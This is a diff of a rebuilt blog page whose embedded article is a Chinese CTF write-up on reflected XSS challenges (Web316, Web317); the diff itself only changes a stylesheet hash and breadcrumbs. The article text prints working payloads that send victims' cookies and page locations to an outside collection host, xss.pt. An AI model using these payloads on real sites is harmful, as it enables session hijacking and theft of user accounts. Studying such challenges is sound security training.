@@ -11,7 +11,7 @@
 <meta name=google-site-verification content="XYZabc">
 <meta name=yandex-verification content="XYZabc">
 <meta name=msvalidate.01 content="XYZabc">
-<link href=/assets/css/stylesheet.min.d32e04e4e05ba717d64f7cc4d5d7984df0a58c072526e387253880784a78c1df.css integrity="sha256-0y4E5OBbpxfWT3zE1deYTfCljAclJuOHJTiAeEp4wd8=" rel="preload stylesheet" as=style>
+<link href=/assets/css/stylesheet.min.7e3eeb64291efee05353e5dcfee7152bc0d0a16497d5b1d05f2c7bb5361bf66b.css integrity="sha256-fj7rZCke/uBTU+Xc/ucVK8DQoWSX1bHQXyx7tTYb9ms=" rel="preload stylesheet" as=style>
 <link rel=icon href=https://shenyiming.life/favicon.ico>
 <link rel=icon type=image/png sizes=16x16 href=https://shenyiming.life/favicon-16x16.png>
 <link rel=icon type=image/png sizes=32x32 href=https://shenyiming.life/favicon-32x32.png>
@@ -35,7 +35,7 @@
 <meta name=twitter:image content="https://shenyiming.life/android-chrome-512x512.png">
 <meta name=twitter:title content="XSS类型题目积累及资料">
 <meta name=twitter:description content="跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足">
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shenyiming.life/post/"},{"@type":"ListItem","position":3,"name":"XSS类型题目积累及资料","item":"https://shenyiming.life/post/ctf/xss/xss/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shenyiming.life/post/"},{"@type":"ListItem","position":3,"name":"🏁CTF","item":"https://shenyiming.life/post/ctf/"},{"@type":"ListItem","position":4,"name":"XSS","item":"https://shenyiming.life/post/ctf/xss/"},{"@type":"ListItem","position":5,"name":"XSS类型题目积累及资料","item":"https://shenyiming.life/post/ctf/xss/xss/"}]}</script>
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"XSS类型题目积累及资料","name":"XSS类型题目积累及资料","description":"跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足","keywords":["CTF","XSS","Web","Note"],"articleBody":" 跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。\n 反射型XSS  反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。\n 无过滤反射型 Web316 - XSS平台 抓包后cookie提示flag在此，但需要管理员身份。\n即生成链接诱骗管理员（本题为BOT）点击获取其cookie。\n借助XSS平台 平台上放置脚本（可自行搭建）\n(function(){(new Image()).src='https://xss.pt/xss.php?do=api\u0026id=Sh8s\u0026location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'\u0026toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'\u0026cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'\u0026opener='+escape((function(){try{return (window.opener \u0026\u0026 window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})(); if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession\u0026id=Sh8s\u0026url='+escape(document.location)+'\u0026cookie='+escape(document.cookie)}; Xss平台 注册登录后创建项目，将其提供的xss代码（引导访问其链接从而存储信息）填入框中，即可获得管理员访问cookie。\n过滤反射型 Web317 -  BODY ONLOAD=document.location='https://xss.pt/Sh8sp.jpg?cookie='+document.cookie;body  window.onload() 方法用于在网页加载完毕后立刻执行的操作，即当 HTML 文档加载完毕后，立刻执行某个方法。\n 参考 [1] XSS平台的使用\n","wordCount":"475","inLanguage":"en","datePublished":"2022-02-26T00:00:00Z","dateModified":"2022-02-26T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyiming.life/post/ctf/xss/xss/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyiming.life/favicon.ico"}}}</script>
 </head>
 <body id=top>
@@ -98,7 +98,7 @@
 <article class=post-single>
 <header class=post-header>
 <div class=breadcrumbs>
-<a href=https://shenyiming.life>首页</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/>文章</a>
+<a href=https://shenyiming.life>首页</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/>文章</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/>🏁CTF</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/xss/>XSS</a>
 </div>
 <h1 class=post-title>
 XSS类型题目积累及资料
@@ -183,7 +183,7 @@ February 26, 2022&nbsp;·&nbsp;February 26, 2022&nbsp;·&nbsp;1 min&nbsp;·&nbsp
 <br>
 <span>HTML Tutorial</span>
 </a>
-<a class=next href=https://shenyiming.life/post/2022%E7%BE%8E%E8%B5%9B%E6%96%87%E6%A1%A3/>
+<a class=next href=https://shenyiming.life/post/notes/matlab/2022%E7%BE%8E%E8%B5%9B%E6%96%87%E6%A1%A3/>
 <span class=title>Next Page »</span>
 <br>
 <span>MCM/ICM 赛后总结</span>
